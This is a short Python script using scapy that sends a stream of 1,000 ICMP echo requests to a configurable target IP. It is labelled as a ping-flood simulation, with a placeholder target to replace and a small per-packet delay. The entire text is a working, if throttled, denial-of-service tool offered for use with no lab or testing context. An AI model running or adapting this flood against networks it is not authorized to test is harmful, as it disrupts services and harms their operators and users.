from scapy.all import IP, ICMP, send
import time

def simulate_ping_flood(target_ip, count=1000):
    packet = IP(dst=target_ip)/ICMP(type=8)  # ICMP Echo Request
    for _ in range(count):
        send(packet, verbose=0)
        time.sleep(0.01)  # Small delay to avoid overwhelming the network

if __name__ == "__main__":
    target_ip = "192.168.1.1"  # Replace with your target IP
    simulate_ping_flood(target_ip)